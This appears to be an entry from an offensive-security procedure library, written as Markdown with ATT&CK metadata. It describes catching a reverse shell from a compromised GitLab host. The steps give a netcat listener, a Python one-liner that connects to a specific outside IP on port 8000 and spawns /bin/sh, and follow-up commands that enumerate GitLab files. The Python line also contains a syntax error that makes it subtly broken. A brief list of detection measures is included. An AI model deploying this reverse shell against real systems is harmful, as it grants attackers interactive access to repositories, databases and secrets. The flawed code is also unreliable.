---
id: proc-establish-reverse-shell
tags:
  - reverse-shell
  - rce
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/python-reverse-shell]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Python]]'
  - '[[Non-Standard Port]]'
updated_at: '2025-12-14T04:09:00.692Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Python]]'
  - '[[Non-Standard Port]]'
---
---

# Establish Reverse Shell Connection

## Summary

This procedure listens for the incoming reverse shell from the executed Python payload, providing interactive access to the GitLab host.

## Description

The payload uses Python to create a TCP socket to the attacker IP:port, dup file descriptors, and spawn /bin/sh. This grants shell access to repositories, DB, and secrets.

## Requirements

1. Public attacker IP/port (e.g., 118.89.198.146:8000)
2. Netcat or similar listener
3. Payload executed via prior steps

## Defense

Defensive measures and detection strategies:

- Network egress filtering on non-standard ports
- Monitor for outbound connections to unknown IPs
- Process monitoring for python subprocess calls

## Objectives

1. Receive shell connection
2. Interact with target system
3. Access sensitive data

## Instructions

### Step 1: Start Listener

**Context**: Listen on specified port.

**Command** (nc listen):
```bash
nc -lvnp 8000
```

> Binds to port 8000. Expected output: Listening message.

### Step 2: Execute Payload and Connect

**Context**: Trigger leads to [[commands/python-reverse-shell]] execution.

**Command** (embedded in payload):
The Python code: `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect("118.89.198.146",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`

> Expected output: Shell prompt on listener.

### Step 3: Interact with Shell

**Context**: Run commands on target.

**Command** (shell test):
```bash
whoami; id; ls /var/www/gitlab
```

> Expected output: User info, gitlab files visible.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Python]]
- [[Non-Standard Port]]

### Sub-Techniques


## Commands Used

- [[commands/python-reverse-shell]]

## Tools Used


## Tags

- [[reverse-shell]]
- [[rce]]

